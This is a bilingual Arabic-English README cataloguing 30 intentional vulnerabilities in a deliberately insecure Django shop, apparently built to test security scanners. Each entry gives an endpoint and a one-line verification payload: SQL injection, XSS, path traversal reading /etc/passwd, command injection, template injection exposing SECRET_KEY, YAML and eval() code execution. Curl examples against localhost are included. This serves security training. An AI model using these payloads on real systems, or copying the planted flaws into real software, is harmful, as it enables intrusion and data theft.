# قائمة الثغرات الأمنية - MyStore E-Commerce
## Vulnerabilities List - Security Testing Environment

> **⚠️ تحذير:** هذا المشروع يحتوي على ثغرات أمنية متعمدة لأغراض الاختبار الأمني فقط.
> 
> **WARNING:** This project contains intentional vulnerabilities for security testing purposes only.

---

## نظرة عامة | Overview

- **إجمالي الثغرات | Total Vulnerabilities:** 30
- **ثغرات حرجة | Critical:** 14
- **ثغرات عالية | High:** 10
- **ثغرات متوسطة | Medium:** 6

---

## تغطية OWASP Top 10 2021

### A01:2021 - Broken Access Control (10 ثغرات)
- GT-04, GT-06, GT-09, GT-16, GT-17, GT-18, GT-21, GT-22, GT-26, GT-27

### A02:2021 - Cryptographic Failures (4 ثغرات)
- GT-03, GT-05, GT-23, GT-28

### A03:2021 - Injection (11 ثغرة)
- GT-01, GT-07, GT-08, GT-10, GT-11, GT-12, GT-13, GT-19, GT-20, GT-24, GT-25

### A05:2021 - Security Misconfiguration (3 ثغرات)
- GT-14, GT-29, GT-30

### A08:2021 - Software and Data Integrity Failures (2 ثغرة)
- GT-02, GT-15

---

## الثغرات حسب الملف | Vulnerabilities by File

### 📁 accounts/views.py (6 ثغرات)

#### GT-01: SQL Injection في البحث عن المستخدمين
- **المسار:** `GET /accounts/api/users/search/?q=`
- **الخطورة:** Critical
- **التحقق:** `?q=' OR '1'='1`

#### GT-02: Insecure Deserialization via Pickle
- **المسار:** `GET /accounts/api/users/export/?data=`
- **الخطورة:** Critical
- **التحقق:** إرسال payload مشفر بـ base64 pickle

#### GT-03: كشف بيانات حساسة
- **المسار:** `GET /accounts/api/users/debug/?id=`
- **الخطورة:** High
- **التحقق:** طلب أي user ID لرؤية password hash

#### GT-04: CSRF + IDOR في تحديث البريد
- **المسار:** `POST /accounts/api/users/update-email/`
- **الخطورة:** High
- **التحقق:** POST بدون CSRF token

#### GT-05: خوارزمية تشفير ضعيفة (MD5)
- **المسار:** `GET /accounts/api/password/weak-reset/?email=`
- **الخطورة:** Medium
- **التحقق:** Token يمكن التنبؤ به

#### GT-06: صلاحيات Admin بدون مصادقة
- **المسار:** `GET /accounts/api/admin/action/?action=&user_id=`
- **الخطورة:** Critical
- **التحقق:** `?action=make_admin&user_id=<uuid>`

---

### 📁 products/views.py (6 ثغرات)

#### GT-07: SQL Injection في البحث عن المنتجات
- **المسار:** `GET /api/search/?q=&sort=`
- **الخطورة:** Critical
- **التحقق:** `?q=' UNION SELECT * FROM accounts_customuser--`

#### GT-08: Reflected XSS في معاينة المنتج
- **المسار:** `GET /api/preview/?name=&description=`
- **الخطورة:** Medium
- **التحقق:** `?name=<script>alert('XSS')</script>`

#### GT-09: Path Traversal في صور المنتجات
- **المسار:** `GET /api/image/?file=`
- **الخطورة:** High
- **التحقق:** `?file=../../../etc/passwd`

#### GT-10: Command Injection في التقارير
- **المسار:** `GET /api/report/?type=&date=`
- **الخطورة:** Critical
- **التحقق:** `?type=sales; cat /etc/passwd`

#### GT-11: Stored XSS في تعليقات المنتجات
- **المسار:** `POST /api/comment/`
- **الخطورة:** Medium
- **التحقق:** POST مع script في comment

#### GT-12: Server-Side Template Injection
- **المسار:** `GET /api/render/?template=`
- **الخطورة:** Critical
- **التحقق:** `?template={{settings.SECRET_KEY}}`

---

### 📁 orders/views.py (6 ثغرات)

#### GT-13: SQL Injection في البحث عن الطلبات
- **المسار:** `GET /orders/api/search/?order_number=&status=`
- **الخطورة:** Critical
- **التحقق:** `?order_number=' OR 1=1--`

#### GT-14: XXE - XML External Entity Injection
- **المسار:** `POST /orders/api/import/xml/`
- **الخطورة:** High
- **التحقق:** POST XML مع external entity

#### GT-15: Insecure YAML Deserialization
- **المسار:** `POST /orders/api/import/yaml/`
- **الخطورة:** Critical
- **التحقق:** `!!python/object/apply:os.system ['id']`

#### GT-16: IDOR في فواتير الطلبات
- **المسار:** `GET /orders/api/invoice/<uuid>/`
- **الخطورة:** High
- **التحقق:** الوصول لأي order UUID بدون مصادقة

#### GT-17: Mass Assignment في تحديث حالة الطلب
- **المسار:** `POST /orders/api/update-status/`
- **الخطورة:** High
- **التحقق:** POST مع حقول إضافية كـ total

#### GT-18: Information Disclosure - تصدير كل الطلبات
- **المسار:** `GET /orders/api/export/`
- **الخطورة:** High
- **التحقق:** الوصول بدون مصادقة

---

### 📁 dashboard/views.py (6 ثغرات)

#### GT-19: SQL Injection في بحث لوحة التحكم
- **المسار:** `GET /dashboard/api/search/?table=&column=&q=`
- **الخطورة:** Critical
- **التحقق:** التلاعب بـ table و column parameters

#### GT-20: Command Injection في النسخ الاحتياطي
- **المسار:** `GET /dashboard/api/backup/?name=&dest=`
- **الخطورة:** Critical
- **التحقق:** `?name=test; cat /etc/passwd`

#### GT-21: Path Traversal في قراءة السجلات
- **المسار:** `GET /dashboard/api/logs/?file=`
- **الخطورة:** High
- **التحقق:** `?file=../../etc/passwd`

#### GT-22: حذف جماعي بدون مصادقة
- **المسار:** `POST /dashboard/api/bulk-delete/`
- **الخطورة:** Critical
- **التحقق:** POST بدون authentication

#### GT-23: كشف معلومات النظام الحساسة
- **المسار:** `GET /dashboard/api/system-info/`
- **الخطورة:** Critical
- **التحقق:** الوصول يكشف SECRET_KEY وبيانات DB

#### GT-24: Code Injection عبر eval()
- **المسار:** `GET /dashboard/api/eval/?expr=`
- **الخطورة:** Critical
- **التحقق:** `?expr=__import__('os').system('id')`

---

### 📁 cart/views.py (3 ثغرات)

#### GT-25: SQL Injection في كود الخصم
- **المسار:** `GET /cart/api/discount/?code=`
- **الخطورة:** Critical
- **التحقق:** `?code=' OR '1'='1`

#### GT-26: CSRF في تحديث السلة
- **المسار:** `POST /cart/api/update-ajax/`
- **الخطورة:** Medium
- **التحقق:** POST من موقع خارجي بدون CSRF token

#### GT-27: IDOR في تفاصيل السلة
- **المسار:** `GET /cart/api/details/?cart_id=`
- **الخطورة:** Medium
- **التحقق:** الوصول لأي cart UUID

---

### 📁 mystore/settings.py (3 ثغرات)

#### GT-28: Hardcoded Secret Key
- **الملف:** `mystore/settings.py`
- **السطر:** SECRET_KEY
- **الخطورة:** Critical
- **التحقق:** فحص الملف

#### GT-29: Debug Mode Enabled في الإنتاج
- **الملف:** `mystore/settings.py`
- **السطر:** DEBUG
- **الخطورة:** High
- **التحقق:** DEBUG=True يكشف معلومات حساسة

#### GT-30: إعدادات Cookies غير آمنة
- **الملف:** `mystore/settings.py`
- **السطر:** SESSION_COOKIE_*
- **الخطورة:** Medium
- **التحقق:** SECURE=False, HTTPONLY=False

---

## كيفية الاختبار | How to Test

### 1. تشغيل السيرفر
```bash
python manage.py runserver
```

### 2. اختبار الثغرات

#### مثال: SQL Injection (GT-01)
```bash
curl "http://localhost:8000/accounts/api/users/search/?q=' OR '1'='1"
```

#### مثال: XSS (GT-08)
```bash
curl "http://localhost:8000/api/preview/?name=<script>alert('XSS')</script>"
```

#### مثال: Path Traversal (GT-09)
```bash
curl "http://localhost:8000/api/image/?file=../../../etc/passwd"
```

#### مثال: Command Injection (GT-10)
```bash
curl "http://localhost:8000/api/report/?type=sales;id"
```

#### مثال: SSTI (GT-12)
```bash
curl "http://localhost:8000/api/render/?template={{settings.SECRET_KEY}}"
```

---

## الأدوات الموصى بها للاختبار

### SAST (Static Analysis)
- Bandit
- Semgrep
- SonarQube
- Snyk

### DAST (Dynamic Analysis)
- OWASP ZAP
- Burp Suite
- Nikto
- SQLMap

### AI-Powered Scanners
- GitHub Copilot Security
- Snyk Code
- DeepCode

---

## ملاحظات مهمة

1. **لا تستخدم في الإنتاج:** هذا المشروع للتدريب فقط
2. **البيئة المعزولة:** قم بالاختبار في بيئة معزولة فقط
3. **النسخ الاحتياطي:** احتفظ بنسخة من قاعدة البيانات قبل الاختبار
4. **القانونية:** اختبر فقط على الأنظمة التي لديك إذن باختبارها

---

## المراجع

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Django Security](https://docs.djangoproject.com/en/stable/topics/security/)

---

**آخر تحديث:** 2026-01-31
